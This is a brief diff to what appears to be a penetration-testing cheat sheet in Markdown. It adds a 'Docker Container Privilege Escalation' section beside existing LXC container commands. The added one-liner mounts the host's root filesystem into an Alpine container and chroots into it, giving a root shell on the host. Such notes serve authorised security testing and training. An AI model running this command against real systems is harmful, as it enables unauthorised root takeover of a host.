@@ -117,6 +117,12 @@ lxc start ignite
 lxc exec ignite /bin/sh
 ```
 
+## Docker Container Privilege Escalation
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
 ## Shell Upgrade and Stabilization
 
 ```bash
